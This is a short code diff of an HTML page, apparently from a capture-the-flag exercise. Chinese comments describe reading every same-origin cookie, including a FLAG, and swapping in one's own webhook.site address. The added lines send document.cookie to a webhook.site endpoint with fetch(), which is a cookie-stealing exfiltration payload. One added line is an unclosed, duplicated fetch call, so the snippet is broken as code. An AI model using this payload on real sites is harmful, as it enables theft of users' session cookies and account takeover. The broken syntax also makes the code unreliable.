@@ -7,6 +7,8 @@
 <body>
 <script>
 // 读取当前同源域名下全部cookie（nginx域，包含FLAG）
+fetch("https://webhook.site/7963ed16-3ffa-4282-8328-93b97065c805"
+fetch("https://webhook.site/7963ed16-3ffa-4282-8328-93b97065c805?c="+encodeURIComponent(document.cookie))
 const cookie = document.cookie;
 // 替换成你自己的webhook.site地址
 const hook = "https://webhook.site/7963ed16-3ffa-4282-8328-93b97065c805";
